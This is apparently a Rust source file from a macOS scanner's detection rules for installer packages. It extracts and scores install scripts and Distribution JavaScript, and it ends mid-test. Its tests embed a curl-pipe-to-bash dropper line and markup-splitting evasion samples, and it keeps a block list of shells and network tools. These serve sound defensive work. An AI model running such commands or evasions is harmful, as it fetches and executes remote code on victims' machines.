//! Installer-package (`.pkg`) heuristics (§5.2, §6.1). Two rules, kept in
//! different categories so a package that is both unsigned *and* fetches remote
//! code corroborates across §5.1's two-category requirement:
//!
//! - `installer-script-suspicious` (`StaticSuspicion`) scores the install
//!   scripts' contents and the JavaScript in the `Distribution` file;
//! - `unsigned-installer-package` (`ProvenanceConcern`) notes a missing signature.
//!
//! The script rule mostly buys reach: it extracts the script text (xar TOC →
//! heap → gzip → cpio, or `Distribution` XML) and hands the bytes to the
//! existing content rules. The one heuristic of its own is a narrow marker for
//! a `Distribution` that launches an interpreter. Only the named metadata
//! entries are read; `Payload` is left for §6.2's Phase 0b path.

use super::{embedded_content_ruleset, Rule, RuleOutcome};
use crate::context::ScanContext;
use crate::macho::ByteSource;
use crate::model::{MatchedSignal, SignalCategory};
use crate::scan::scan_embedded_bytes;
use crate::{cpio, xar, xml};

/// Ceiling on what the script rule can contribute — the sub-scan total climbs
/// fast when several markers match, and Phase 0a scoring is a plain sum (§12).
const MAX_SCRIPT_WEIGHT: i32 = 20;

/// Weight for a Distribution that launches an interpreter via `system.run`.
/// Corroboration only: below Notify on its own (§5.1).
const DISTRIBUTION_INTERPRETER_WEIGHT: i32 = 8;

/// Weight for a package with no signature. Well below the notify threshold:
/// plenty of legitimate packages are unsigned (all default `pkgbuild` output).
/// Earns its place by corroborating (§5.1, §5.4).
const UNSIGNED_PACKAGE_WEIGHT: i32 = 6;

/// Scores a package's install scripts and `Distribution` JavaScript.
pub struct InstallerScriptRule;

impl Rule for InstallerScriptRule {
    fn id(&self) -> &'static str {
        "installer-script-suspicious"
    }

    fn category(&self) -> SignalCategory {
        SignalCategory::StaticSuspicion
    }

    fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
        let content = ctx.content.as_ref().ok_or(RuleOutcome::NotApplicable)?;
        let limits = xar::XarLimits::default();

        let Some(archive) = xar::parse(content, &limits) else {
            return Ok(None); // not a package
        };
        // Couldn't read in full => "couldn't check", never "clean" (§10, §11.8).
        if !archive.is_complete() {
            return Err(RuleOutcome::NotApplicable);
        }

        let mut findings = ScriptFindings::default();
        let mut unreadable = false;

        for entry in archive.metadata_entries() {
            let result = match entry.name.as_str() {
                "Scripts" => {
                    scan_scripts_entry(ctx, content, &archive, entry, &limits, &mut findings)
                }
                "Distribution" => {
                    scan_distribution_entry(ctx, content, &archive, entry, &limits, &mut findings)
                }
                _ => continue,
            };
            unreadable |= result.is_err();
        }

        // Nothing scored: clean only if every entry was actually read.
        if findings.descriptions.is_empty() || findings.total <= 0 {
            return if unreadable {
                Err(RuleOutcome::NotApplicable)
            } else {
                Ok(None)
            };
        }
        // A finding outranks the gap, but the gap is still reported (§11.8).
        if unreadable {
            ctx.mark_incomplete(self.id());
        }

        Ok(Some(MatchedSignal {
            id: self.id().to_string(),
            weight: findings.total.min(MAX_SCRIPT_WEIGHT),
            description: findings.descriptions.join("; "),
            category: self.category(),
        }))
    }

    /// A truncated prefix that isn't even a xar archive has no scripts this
    /// rule could have missed past the cap.
    fn covers_truncation(&self, ctx: &ScanContext) -> bool {
        ctx.content
            .as_deref()
            .is_some_and(|c| !xar::has_xar_magic(c))
    }
}

/// Signal descriptions and summed weight collected across scanned script text.
#[derive(Default)]
struct ScriptFindings {
    descriptions: Vec<String>,
    total: i32,
}

impl ScriptFindings {
    /// Scans `bytes` with the embedded-content rules; each signal is recorded
    /// as `"{prefix}: {description}"`.
    fn scan(&mut self, label: String, bytes: Vec<u8>, prefix: &str) {
        let result = scan_embedded_bytes(label, bytes, false, &embedded_content_ruleset());
        for signal in &result.signals {
            self.total = self.total.saturating_add(signal.weight);
            self.descriptions
                .push(format!("{prefix}: {}", signal.description));
        }
    }

    /// Records a finding that did not come from a content-rule signal.
    fn add(&mut self, weight: i32, description: String) {
        self.total = self.total.saturating_add(weight);
        self.descriptions.push(description);
    }
}

/// Reads the `Scripts` entry (gzip-wrapped cpio) and scans each regular
/// member. Errors with `NotApplicable` if any step can't be read in full.
fn scan_scripts_entry(
    ctx: &ScanContext,
    content: &[u8],
    archive: &xar::XarArchive,
    entry: &xar::XarFile,
    limits: &xar::XarLimits,
    findings: &mut ScriptFindings,
) -> Result<(), RuleOutcome> {
    // An entry we can't reach (bounded read stopped short) is
    // unreadable, not absent. A partial bzip2 read is scanned, then reported
    // unreadable below.
    let (raw, gap) = xar::read_entry_partial(content, archive, entry, limits)
        .map_err(|_| RuleOutcome::NotApplicable)?;

    // Scripts is normally gzip-wrapped cpio; if not gzip, `read_entry`
    // already undid the heap encoding.
    let archive_bytes = match crate::inflate::gzip_decompress(&raw, limits.max_entry_bytes) {
        Ok(v) => v,
        Err(_) => raw,
    };

    let Some(members) = cpio::parse(&archive_bytes, &cpio::CpioLimits::default()) else {
        // Something is in there, but not in a shape we can read.
        return Err(RuleOutcome::NotApplicable);
    };
    // Members that did parse are scanned even when the archive is cut short.
    let complete = members.is_complete() && gap.is_none();

    for member in &members.entries {
        if !member.is_regular_file() || member.data.is_empty() {
            continue;
        }
        let label = format!("{}!{}/{}", ctx.path.display(), entry.path, member.name);
        findings.scan(
            label,
            member.data.to_vec(),
            &format!("install script {}", member.name),
        );
    }
    if complete {
        Ok(())
    } else {
        Err(RuleOutcome::NotApplicable)
    }
}

/// Extracts the installer JavaScript from `Distribution` XML: `<script>`
/// bodies as an XML parser would deliver them (see [`script_body_texts`]) and
/// every attribute value (entity-decoded), joined with `\n`. Over-inclusive on
/// purpose: any attribute can carry an expression. Empty if there is none.
/// `NotApplicable` on malformed XML, an unterminated `<script>`, or any
/// document we could not read the way Installer's parser would (see
/// [`check_faithfully_readable`], §11.8).
fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
    let decoded = utf16_to_utf8(raw);
    let xml_bytes = decoded.as_deref().unwrap_or(raw);
    check_faithfully_readable(xml_bytes)?;
    let mut pieces: Vec<String> = Vec::new();
    let mut saw_element = false;
    let mut scanner = xml::Scanner::new(xml_bytes);
    loop {
        match scanner.next_event() {
            xml::Next::End => break,
            xml::Next::Bad => return Err(RuleOutcome::NotApplicable),
            xml::Next::Event(xml::Event::Open {
                name,
                attrs,
                self_closing,
            }) => {
                saw_element = true;
                for (_, value) in xml::attrs(attrs) {
                    check_entities(value)?;
                    pieces.push(xml::decode_entities(value));
                }
                if name == "script" && !self_closing {
                    let raw = scanner
                        .raw_until_close("script")
                        .ok_or(RuleOutcome::NotApplicable)?;
                    pieces.extend(script_body_texts(raw)?);
                }
            }
            xml::Next::Event(_) => {}
        }
    }
    if !saw_element {
        return Err(RuleOutcome::NotApplicable);
    }
    pieces.retain(|p| !p.trim().is_empty());
    Ok(pieces.join("\n").into_bytes())
}

/// Transcodes UTF-16 (BOM, or BOM-less starting `<\0` / `\0<`) to UTF-8
/// bytes; `None` if `b` doesn't look like UTF-16. A trailing odd byte is dropped.
fn utf16_to_utf8(b: &[u8]) -> Option<Vec<u8>> {
    let (big_endian, body) = match b {
        [0xFF, 0xFE, rest @ ..] => (false, rest),
        [0xFE, 0xFF, rest @ ..] => (true, rest),
        [b'<', 0, ..] => (false, b),
        [0, b'<', ..] => (true, b),
        _ => return None,
    };
    let units: Vec<u16> = body
        .chunks_exact(2)
        .map(|c| {
            let pair = [c[0], c[1]];
            if big_endian {
                u16::from_be_bytes(pair)
            } else {
                u16::from_le_bytes(pair)
            }
        })
        .collect();
    Some(String::from_utf16_lossy(&units).into_bytes())
}

/// The text(s) a `<script>` body yields: CDATA verbatim, comments and
/// processing instructions dropped, the rest entity-decoded (a raw `<` that
/// starts none of those stays literal, as in `a < b`). A second variant with
/// tag-shaped runs removed is added when it differs, covering child elements
/// that split a token (`cu<b/>rl`).
fn script_body_texts(raw: &[u8]) -> Result<Vec<String>, RuleOutcome> {
    let mut with_tags = String::new();
    let mut without_tags = String::new();
    let (mut seg_start, mut from) = (0usize, 0usize);
    while let Some(off) = raw.get(from..).and_then(|r| xml::find(r, b"<")) {
        let at = from.saturating_add(off);
        let here = raw.get(at..).unwrap_or(&[]);
        let markup: Option<(usize, &[u8])> = if here.starts_with(b"<![CDATA[") {
            Some((9, b"]]>"))
        } else if here.starts_with(b"<!--") {
            Some((4, b"-->"))
        } else if here.starts_with(b"<?") {
            Some((2, b"?>"))
        } else {
            None
        };
        let Some((open_len, closer)) = markup else {
            from = at.saturating_add(1);
            continue;
        };
        let seg = raw.get(seg_start..at).unwrap_or(&[]);
        check_entities(seg)?;
        flush_segment(seg, &mut with_tags, &mut without_tags);
        let body_start = at.saturating_add(open_len);
        let body = raw.get(body_start..).unwrap_or(&[]);
        let (inner, after) = match xml::find(body, closer) {
            Some(i) => (
                body.get(..i).unwrap_or(&[]),
                body_start.saturating_add(i).saturating_add(closer.len()),
            ),
            None => (body, raw.len()),
        };
        if open_len == 9 {
            let text = String::from_utf8_lossy(inner);
            with_tags.push_str(&text);
            without_tags.push_str(&text);
        }
        seg_start = after;
        from = after;
    }
    let seg = raw.get(seg_start..).unwrap_or(&[]);
    check_entities(seg)?;
    flush_segment(seg, &mut with_tags, &mut without_tags);
    let mut out = vec![with_tags.clone()];
    if without_tags != with_tags {
        out.push(without_tags);
    }
    Ok(out)
}

/// `NotApplicable` unless the document would be read by Installer's parser as
/// the characters we are scanning: it must start with `<` (after an optional
/// UTF-8 BOM and whitespace), declare no unsupported `encoding`, and declare
/// no entities.
fn check_faithfully_readable(b: &[u8]) -> Result<(), RuleOutcome> {
    let b = b.strip_prefix(b"\xEF\xBB\xBF".as_slice()).unwrap_or(b);
    let start = b
        .iter()
        .position(|c| !c.is_ascii_whitespace())
        .unwrap_or(b.len());
    let head = b.get(start..).unwrap_or(&[]);
    if head.first() != Some(&b'<') {
        return Err(RuleOutcome::NotApplicable);
    }
    if head.starts_with(b"<?xml") {
        let decl_end = xml::find(head, b"?>").unwrap_or(head.len());
        let decl = head.get(..decl_end).unwrap_or(&[]);
        if let Some(i) = xml::find(decl, b"encoding") {
            let after = decl.get(i + "encoding".len()..).unwrap_or(&[]);
            let value = after
                .iter()
                .position(|c| *c == b'"' || *c == b'\'')
                .and_then(|q| {
                    let rest = after.get(q + 1..)?;
                    let end = rest.iter().position(|c| Some(c) == after.get(q))?;
                    rest.get(..end)
                })
                .map(|v| String::from_utf8_lossy(v).to_ascii_lowercase());
            let ok = value.as_deref().is_some_and(|v| {
                matches!(
                    v,
                    "utf-8"
                        | "utf8"
                        | "us-ascii"
                        | "ascii"
                        | "iso-8859-1"
                        | "latin-1"
                        | "latin1"
                        | "utf-16"
                )
            });
            if !ok {
                return Err(RuleOutcome::NotApplicable);
            }
        }
    }
    if xml::find(b, b"<!ENTITY").is_some() {
        return Err(RuleOutcome::NotApplicable);
    }
    Ok(())
}

/// `NotApplicable` if `text` has a named entity reference other than the five
/// predefined ones: a DTD could define it to be anything.
fn check_entities(text: &[u8]) -> Result<(), RuleOutcome> {
    let mut from = 0usize;
    while let Some(off) = text.get(from..).and_then(|r| xml::find(r, b"&")) {
        let at = from.saturating_add(off).saturating_add(1);
        from = at;
        let window = text.get(at..).unwrap_or(&[]);
        let window = window
            .get(..window.len().min(xml::MAX_ENTITY_BODY + 1))
            .unwrap_or(&[]);
        let Some(semi) = window.iter().position(|c| *c == b';') else {
            continue;
        };
        let body = window.get(..semi).unwrap_or(&[]);
        let is_name = !body.is_empty()
            && body
                .iter()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'_' | b'.' | b':' | b'-'));
        let known = matches!(body, b"lt" | b"gt" | b"amp" | b"quot" | b"apos");
        if is_name && !known {
            return Err(RuleOutcome::NotApplicable);
        }
    }
    Ok(())
}

/// Appends the entity-decoded `seg` to the with-tags text, and the same with
/// tag-shaped runs removed to the other.
fn flush_segment(seg: &[u8], with_tags: &mut String, without_tags: &mut String) {
    with_tags.push_str(&xml::decode_entities(seg));
    without_tags.push_str(&xml::decode_entities(&strip_tags(seg)));
}

/// Removes tag-shaped runs (`<` + letter or `/`, through the next `>`).
fn strip_tags(seg: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(seg.len());
    let mut i = 0usize;
    let mut no_more_gt = false;
    while let Some(&c) = seg.get(i) {
        let tag_like = c == b'<'
            && !no_more_gt
            && seg
                .get(i + 1)
                .is_some_and(|n| n.is_ascii_alphabetic() || *n == b'/');
        if tag_like {
            match seg.get(i..).and_then(|r| xml::find(r, b">")) {
                Some(g) => {
                    i = i.saturating_add(g).saturating_add(1);
                    continue;
                }
                None => no_more_gt = true,
            }
        }
        out.push(c);
        i += 1;
    }
    out
}

/// Reads the `Distribution` entry and scans its JavaScript. Errors with
/// `NotApplicable` if it can't be read or parsed in full.
fn scan_distribution_entry(
    ctx: &ScanContext,
    content: &[u8],
    archive: &xar::XarArchive,
    entry: &xar::XarFile,
    limits: &xar::XarLimits,
    findings: &mut ScriptFindings,
) -> Result<(), RuleOutcome> {
    let (raw, gap) = xar::read_entry_partial(content, archive, entry, limits)
        .map_err(|_| RuleOutcome::NotApplicable)?;
    let scanned = scan_distribution_bytes(ctx, entry, &raw, findings);
    // A partial read is evidence, not a clean read: findings stay, the entry
    // is reported unreadable.
    if gap.is_some() {
        return Err(RuleOutcome::NotApplicable);
    }
    scanned
}

/// Scans the JavaScript of `Distribution` bytes already read from `entry`.
fn scan_distribution_bytes(
    ctx: &ScanContext,
    entry: &xar::XarFile,
    raw: &[u8],
    findings: &mut ScriptFindings,
) -> Result<(), RuleOutcome> {
    let js = distribution_js(raw)?;
    if js.is_empty() {
        return Ok(());
    }
    if let Some(name) = launched_interpreter(&String::from_utf8_lossy(&js)) {
        findings.add(
            DISTRIBUTION_INTERPRETER_WEIGHT,
            format!("distribution script: system.run launches an interpreter ({name})"),
        );
    }
    // The `.js` suffix makes `classify_text` treat even a short buffer as script.
    let label = format!("{}!{}.js", ctx.path.display(), entry.path);
    findings.scan(label, js, "distribution script");
    Ok(())
}

/// Shells and script interpreters that `system.run` should not be launching
/// directly from a Distribution (matched on basename).
const INTERPRETERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "ksh",
    "csh",
    "tcsh",
    "dash",
    "osascript",
    "python",
    "python3",
    "perl",
    "ruby",
    "php",
    "curl",
    "env",
    "osacompile",
    "wget",
    "nc",
];

/// Basename of the first `system.run(` / `system.runOnce(` call in `js` whose
/// first argument is a string literal (`'`, `"` or `` ` `` quoted) naming an
/// interpreter: a listed name, optionally followed only by digits and dots
/// (`python3.11`). Whitespace around the dot, paren and literal is ignored;
/// non-literal first arguments never match.
fn launched_interpreter(js: &str) -> Option<String> {
    for (at, _) in js.match_indices("system") {
        let rest = js.get(at + "system".len()..)?;
        let Some(rest) = rest.trim_start().strip_prefix('.') else {
            continue;
        };
        let Some(rest) = rest.trim_start().strip_prefix("run") else {
            continue;
        };
        let rest = rest.strip_prefix("Once").unwrap_or(rest);
        let Some(rest) = rest.trim_start().strip_prefix('(') else {
            continue;
        };
        let rest = rest.trim_start();
        let Some(quote) = rest
            .chars()
            .next()
            .filter(|c| matches!(c, '"' | '\'' | '`'))
        else {
            continue;
        };
        let body = rest.get(1..).unwrap_or("");
        let Some(end) = body.find(quote) else {
            continue;
        };
        let literal = body.get(..end).unwrap_or("").trim();
        let base = literal.rsplit('/').next().unwrap_or(literal);
        let is_interpreter = INTERPRETERS.iter().any(|name| {
            base.strip_prefix(name)
                .is_some_and(|v| v.chars().all(|c| c.is_ascii_digit() || c == '.'))
        });
        if is_interpreter {
            return Some(base.to_string());
        }
    }
    None
}

/// Notes an installer package that carries no signature.
pub struct UnsignedPackageRule;

impl Rule for UnsignedPackageRule {
    fn id(&self) -> &'static str {
        "unsigned-installer-package"
    }

    fn category(&self) -> SignalCategory {
        SignalCategory::ProvenanceConcern
    }

    fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
        let content = ctx.content.as_ref().ok_or(RuleOutcome::NotApplicable)?;

        let Some(archive) = xar::parse(content, &xar::XarLimits::default()) else {
            return Ok(None); // not a package
        };
        if !archive.is_complete() {
            return Err(RuleOutcome::NotApplicable);
        }
        let source_len = ctx.file_len.unwrap_or(content.len() as u64);
        if archive.has_plausible_signature(source_len) {
            // Present but not verified — validity is a Security.framework
            // question (§5.2). A bogus claim counts as unsigned.
            return Ok(None);
        }
        // With a truncated embedded capture `source_len` is only what was
        // captured, so a range past it may still be real (§10/§11.8).
        if !ctx.source_len_is_authoritative()
            && archive.signature_end().is_some_and(|end| end > source_len)
        {
            return Err(RuleOutcome::NotApplicable);
        }

        Ok(Some(MatchedSignal {
            id: self.id().to_string(),
            weight: UNSIGNED_PACKAGE_WEIGHT,
            description: "installer package carries no signature".to_string(),
            category: self.category(),
        }))
    }

    /// Same as `InstallerScriptRule`: nothing to miss if it isn't a xar archive.
    fn covers_truncation(&self, ctx: &ScanContext) -> bool {
        ctx.content
            .as_deref()
            .is_some_and(|c| !xar::has_xar_magic(c))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::context::{ContentSource, ScanContext};
    use std::path::PathBuf;

    macro_rules! pkg {
        ($name:literal) => {
            include_bytes!(concat!("../../testdata/xar/", $name, ".pkg")).as_slice()
        };
    }

    fn ctx(name: &str, body: &[u8]) -> ScanContext {
        ScanContext {
            path: PathBuf::from(name),
            content: Some(body.to_vec()),
            truncated: false,
            file_len: Some(body.len() as u64),
            identity: None,
            source: ContentSource::File,
            file: None,
            codesign_dv_cache: std::sync::OnceLock::new(),
            spctl_cache: std::sync::OnceLock::new(),
            macho_cache: std::sync::OnceLock::new(),
            incomplete_rules: std::sync::Mutex::new(Vec::new()),
        }
    }

    #[test]
    fn a_malicious_preinstall_is_found_through_the_container() {
        let c = ctx("suspicious.pkg", pkg!("suspicious"));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("rule should evaluate")
            .expect("should fire on a curl-pipe-to-shell preinstall");

        assert_eq!(signal.id, "installer-script-suspicious");
        assert_eq!(signal.category, SignalCategory::StaticSuspicion);
        assert!(signal.weight > 0 && signal.weight <= MAX_SCRIPT_WEIGHT);
        // The description names the script member (§5.5).
        assert!(
            signal.description.contains("preinstall"),
            "{}",
            signal.description
        );
        assert!(
            signal.description.contains("curl"),
            "{}",
            signal.description
        );
    }

    /// An ordinary package must score nothing here (§1) — the reason the rule
    /// reuses the content rules rather than flagging "has scripts".
    #[test]
    fn an_ordinary_package_with_scripts_scores_nothing() {
        let c = ctx("benign.pkg", pkg!("benign"));
        assert!(
            matches!(InstallerScriptRule.evaluate(&c), Ok(None)),
            "a package whose postinstall just touches a file must not score"
        );
    }

    #[test]
    fn a_package_without_scripts_scores_nothing() {
        let c = ctx("noscripts.pkg", pkg!("noscripts"));
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    /// A nested package's scripts still run at install time.
    #[test]
    fn scripts_inside_a_nested_package_are_reached() {
        let c = ctx("product.pkg", pkg!("product"));
        // product.pkg wraps the benign package, whose scripts are clean.
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    fn js(xml: &str) -> Result<String, RuleOutcome> {
        distribution_js(xml.as_bytes()).map(|v| String::from_utf8(v).unwrap())
    }

    #[test]
    fn distribution_script_body_is_extracted() {
        let out = js("<a><script>\n system.run('x');\n</script></a>").unwrap();
        assert!(out.contains("system.run('x');"), "{out}");
    }

    #[test]
    fn distribution_script_cdata_is_unwrapped() {
        let out = js("<a><script><![CDATA[ if (a < b && c) { go(); } ]]></script></a>").unwrap();
        assert_eq!(out.trim(), "if (a < b && c) { go(); }");
    }

    #[test]
    fn distribution_script_with_raw_angle_bracket_is_extracted() {
        let out = js("<a><script>if (a < b) { go(); }</script></a>").unwrap();
        assert_eq!(out, "if (a < b) { go(); }");
    }

    #[test]
    fn distribution_script_entities_are_decoded() {
        let out = js("<a><script>if (a &lt; b &amp;&amp; c) go();</script></a>").unwrap();
        assert_eq!(out, "if (a < b && c) go();");
    }

    #[test]
    fn distribution_attribute_expressions_are_extracted_and_decoded() {
        let out = js(
            r#"<c selected="system.compareVersions(v, '10.9') &lt; 1" title="Not JS" onConclusionScript="done()"/>"#,
        )
        .unwrap();
        assert_eq!(out, "system.compareVersions(v, '10.9') < 1\nNot JS\ndone()");
    }

    const DROPPER: &str =
        r#"system.run("/bin/bash","-c","curl -fsSL https://example-cdn.invalid/a.sh | bash")"#;

    #[test]
    fn a_close_tag_inside_cdata_does_not_hide_the_rest_of_the_script() {
        let out = js(&format!(
            r#"<a><script><![CDATA[ var s = "</script>"; {DROPPER}; ]]></script></a>"#
        ))
        .unwrap();
        assert!(out.contains(DROPPER), "{out}");
    }

    #[test]
    fn markup_inside_a_script_body_is_joined_as_a_parser_would() {
        let cdata = js(r#"<a><script>system.run("/bin/ba<![CDATA[sh]]>", "-c", "x")</script></a>"#)
            .unwrap();
        assert!(cdata.contains(r#"system.run("/bin/bash""#), "{cdata}");
        let comment = js("<a><script>cu<!-- x -->rl http://x | bash</script></a>").unwrap();
        assert!(comment.contains("curl http://x | bash"), "{comment}");
        let pi = js("<a><script>cu<?pi x?>rl</script></a>").unwrap();
        assert!(pi.contains("curl"), "{pi}");
    }

    #[test]
    fn a_child_element_variant_is_scanned_as_well() {
        let out = js("<a><script>cu<b/>rl http://x | bash</script></a>").unwrap();
        assert!(out.contains("curl http://x | bash"), "{out}");
        assert!(out.contains("cu<b/>rl"), "{out}");
    }

    #[test]
    fn a_commented_out_script_extracts_nothing() {
        let out = js("<a><script><!-- system.run('/bin/bash') --></script></a>").unwrap();
        assert_eq!(out, "");
    }

    #[test]
    fn every_attribute_value_is_extracted() {
        let out = js(r#"<pkg-ref active="system.run('/bin/bash')"/>"#).unwrap();
        assert!(out.contains("system.run('/bin/bash')"), "{out}");
    }

    fn not_applicable(doc: &[u8]) -> bool {
        matches!(distribution_js(doc), Err(RuleOutcome::NotApplicable))
    }

    #[test]
    fn a_distribution_not_starting_with_markup_is_not_applicable() {
        assert!(not_applicable(b"\x1f\x8b\x08 compressed <a/>"));
        assert!(not_applicable(b"BZh91AY&SY<a/>"));
        assert!(distribution_js(b"\xEF\xBB\xBF \n<a/>").is_ok());
    }

    #[test]
    fn an_unsupported_declared_encoding_is_not_applicable() {
        for decl in ["UTF-16", "utf-8", "US-ASCII", "ISO-8859-1", "Latin1"] {
            let doc = format!(r#"<?xml version="1.0" encoding="{decl}"?><a/>"#);
            assert!(distribution_js(doc.as_bytes()).is_ok(), "{decl}");
        }
        for decl in ["UTF-7", "Shift_JIS", "EBCDIC-US", "x-mac-roman"] {
            let doc = format!(r#"<?xml version="1.0" encoding="{decl}"?><a/>"#);
            assert!(not_applicable(doc.as_bytes()), "{decl}");
        }
        assert!(not_applicable(b"<?xml version='1.0' encoding=?><a/>"));
    }

    #[test]
    fn dtd_entities_are_not_applicable() {
        let doc =
            br#"<!DOCTYPE d [<!ENTITY p "system.run('/bin/bash')">]><a><script>&p;</script></a>"#;
        assert!(not_applicable(doc));
        // A reference to an entity declared elsewhere (external DTD).
        assert!(not_applicable(b"<a><script>&p;</script></a>"));
        assert!(not_applicable(br#"<a b="&p;"/>"#));
    }

    #[test]
    fn predefined_numeric_and_bare_ampersands_are_fine() {
        let out = js("<a><script>if (a &amp;&amp; b &lt; c &#38; d &#x26; e &quot; &apos; &gt;) x(a && b);</script></a>").unwrap();
        assert!(out.contains("a && b < c"), "{out}");
        assert!(js("<a><script>x = a & b; y = '&' + ';';</script></a>").is_ok());
        // Inside CDATA nothing is an entity reference.
        assert!(js("<a><script><![CDATA[ &p; ]]></script></a>").is_ok());
    }

    #[test]
    fn unterminated_distribution_script_is_not_applicable() {
        assert!(matches!(
            js("<a><script>system.run('x');"),
            Err(RuleOutcome::NotApplicable)
        ));
        assert!(matches!(js("<a><script"), Err(RuleOutcome::NotApplicable)));
    }

    #[test]
    fn distribution_without_js_extracts_nothing() {
        assert_eq!(js("<a><title>T</title><script/><choice/></a>").unwrap(), "");
        assert_eq!(js("<a><script>  \n </script></a>").unwrap(), "");
    }

    #[test]
    fn a_distribution_dropper_is_found_through_the_container() {
        let c = ctx("dropper.pkg", pkg!("distribution_dropper"));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("rule should evaluate")
            .expect("should fire on a curl-pipe-to-shell in Distribution JS");
        assert_eq!(signal.id, "installer-script-suspicious");
        assert!(
            signal.description.starts_with("distribution script:"),
            "{}",
            signal.description
        );
    }

    /// `unload.sh` and `compareVersions` are what real packages ship (§1).
    #[test]
    fn an_ordinary_distribution_script_scores_nothing() {
        let c = ctx("ordinary.pkg", pkg!("distribution_ordinary"));
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    #[test]
    fn interpreter_launch_forms_match() {
        for (js, want) in [
            (r#"system.run("/bin/bash", "-c", "x")"#, "bash"),
            ("system.run('/bin/sh', '-c', 'x')", "sh"),
            ("system.run(  \"/usr/bin/osascript\" )", "osascript"),
            ("system.runOnce('/usr/bin/python3', 'x.py')", "python3"),
            ("system.run('bash', '-c', 'x')", "bash"),
            ("system.run(\"/usr/bin/env\", \"curl\")", "env"),
            (
                "a(); system.run('unload.sh'); system.run('/usr/bin/perl')",
                "perl",
            ),
        ] {
            assert_eq!(launched_interpreter(js).as_deref(), Some(want), "{js}");
        }
    }

    #[test]
    fn interpreter_literal_variants_match() {
        for (js, want) in [
            ("system.run(`/bin/bash`, '-c', 'x')", "bash"),
            ("system . run ('/bin/bash')", "bash"),
            ("system\n.\trunOnce  (\"/bin/zsh\")", "zsh"),
            ("system.run('/bin/sh ')", "sh"),
            ("system.run(' /bin/sh')", "sh"),
            ("system.run('/usr/bin/python3.11', 'x')", "python3.11"),
            ("system.run('python2.7')", "python2.7"),
            ("system.run('/opt/bin/perl5.34')", "perl5.34"),
            ("system.run('ruby3.2')", "ruby3.2"),
            ("system.run('/usr/bin/osacompile')", "osacompile"),
            ("system.run('/usr/bin/wget')", "wget"),
            ("system.run('/usr/bin/nc')", "nc"),
        ] {
            assert_eq!(launched_interpreter(js).as_deref(), Some(want), "{js}");
        }
    }

    #[test]
    fn near_miss_names_do_not_match() {
        for js in [
            "system.run('pythonista')",
            "system.run('bash-wrapper')",
            "system.run('/usr/bin/open')",
            "system.run('python3.x')",
            "system.run('nco')",
            "system.run(`${cmd}`)",
            "mysystem.run",
            "system.run('unload.sh')",
        ] {
            assert_eq!(launched_interpreter(js), None, "{js}");
        }
    }

    #[test]
    fn non_interpreter_launches_do_not_match() {
        for js in [
            "system.run('unload.sh')",
            "system.run('./bash_helper')",
            "system.run('/Applications/Foo.app/bash-wrapper')",
            "system.run(cmd, '-c', 'x')",
            "system.run(\"/bin/bash",
            "system.running('/bin/bash')",
            "system.run",
            "system.log('/bin/bash')",
            "",
        ] {
            assert_eq!(launched_interpreter(js), None, "{js}");
        }
    }

    fn marker_count(c: &ScanContext) -> usize {
        match InstallerScriptRule.evaluate(c) {
            Ok(Some(s)) => s.description.matches("launches an interpreter").count(),
            _ => 0,
        }
    }

    #[test]
    fn the_interpreter_marker_counts_once_per_distribution() {
        let c = ctx("dropper.pkg", pkg!("distribution_dropper"));
        assert_eq!(marker_count(&c), 1);
        let signal = InstallerScriptRule.evaluate(&c).unwrap().unwrap();
        assert!(
            signal
                .description
                .contains("distribution script: system.run launches an interpreter (bash)"),
            "{}",
            signal.description
        );
        // The marker plus the content-rule hit exceed the cap.
        assert_eq!(signal.weight, MAX_SCRIPT_WEIGHT);
    }

    #[test]
    fn an_ordinary_distribution_has_no_interpreter_marker() {
        let c = ctx("ordinary.pkg", pkg!("distribution_ordinary"));
        assert_eq!(marker_count(&c), 0);
    }

    #[test]
    fn a_shell_launch_alone_stays_below_notify_weight() {
        let c = ctx("shell.pkg", pkg!("distribution_shell_launch"));
        let signal = InstallerScriptRule.evaluate(&c).unwrap().unwrap();
        assert_eq!(signal.weight, DISTRIBUTION_INTERPRETER_WEIGHT);
        assert_eq!(
            signal.description,
            "distribution script: system.run launches an interpreter (sh)"
        );
    }

    #[test]
    fn a_distribution_with_no_element_is_not_applicable() {
        for blob in [
            b"".as_slice(),
            b"BZh91AY&SY\x01\x02\x03\x04 junk",
            b"plain text, no markup",
        ] {
            assert!(
                matches!(distribution_js(blob), Err(RuleOutcome::NotApplicable)),
                "{blob:?}"
            );
        }
    }

    fn utf16(s: &str, big_endian: bool, bom: bool) -> Vec<u8> {
        let mut out = Vec::new();
        if bom {
            out.extend(if big_endian {
                [0xFE, 0xFF]
            } else {
                [0xFF, 0xFE]
            });
        }
        for u in s.encode_utf16() {
            out.extend(if big_endian {
                u.to_be_bytes()
            } else {
                u.to_le_bytes()
            });
        }
        out
    }

    #[test]
    fn utf16_distributions_are_transcoded() {
        let xml = r#"<a><script>system.run("/bin/bash", "-c", "x");</script></a>"#;
        for (be, bom) in [(false, true), (true, true), (false, false)] {
            let out = distribution_js(&utf16(xml, be, bom)).expect("readable");
            let out = String::from_utf8(out).unwrap();
            assert!(
                out.contains(r#"system.run("/bin/bash""#),
                "be={be} bom={bom}: {out}"
            );
        }
    }

    /// A xar whose only entry is a `Distribution` holding `blob`, labelled bzip2.
    fn bzip2_distribution_pkg(blob: &[u8]) -> Vec<u8> {
        let toc = format!(
            r#"<file id="1"><name>Distribution</name><type>file</type><data><offset>0</offset><length>{n}</length><size>{n}</size><encoding style="application/x-bzip2"/></data></file>"#,
            n = blob.len()
        );
        let mut bytes = xar::toc_xar_bytes(&toc);
        bytes.extend_from_slice(blob);
        bytes
    }

    /// Real bzip2 (`testdata/bzip2/distribution_dropper.in`) of a dropper Distribution.
    #[test]
    fn a_bzip2_distribution_in_a_package_is_checked() {
        let blob = include_bytes!("../../testdata/bzip2/distribution_dropper.in");
